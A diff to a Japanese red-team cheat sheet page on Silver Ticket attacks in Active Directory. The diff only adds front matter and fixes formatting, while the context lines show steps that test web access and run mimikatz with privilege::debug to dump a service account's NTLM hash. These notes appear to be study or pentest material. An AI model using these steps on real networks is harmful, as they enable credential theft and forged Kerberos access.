@@ -1,3 +1,9 @@
+---
+title: Silver Ticket
+parent: Active Directory
+grand_parent: Red Team
+---
+
 ## 攻撃の概要
 
 ### シルバーチケットを作成するには、次の 3 つの情報を収集する必要がある
@@ -7,6 +13,7 @@
 
 この例では、 iis_serviceユーザーがCLIENT75でセッションを確立していることがわかっているものとします。
 ## 現在のユーザがWebサイトにアクセスできるかの確認
+
 ```powershell
 iwr -UseDefaultCredentials http://web04
 ```
@@ -17,6 +24,7 @@ iwr : Server Error
 ```
 
 ## 1. SPN パスワード ハッシュ ( iis_serviceの NTLM ハッシュ) を取得
+
 ```powershell
 .\mimikatz.exe
 privilege::debug
@@ -64,7 +72,7 @@ klist
 ```
 ![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090846.png)
 
-# ## 現在のユーザがWebサイトにアクセスできるかの再確認
+# 現在のユーザがWebサイトにアクセスできるかの再確認
 ```powershell
 iwr -UseDefaultCredentials http://web04
 ```
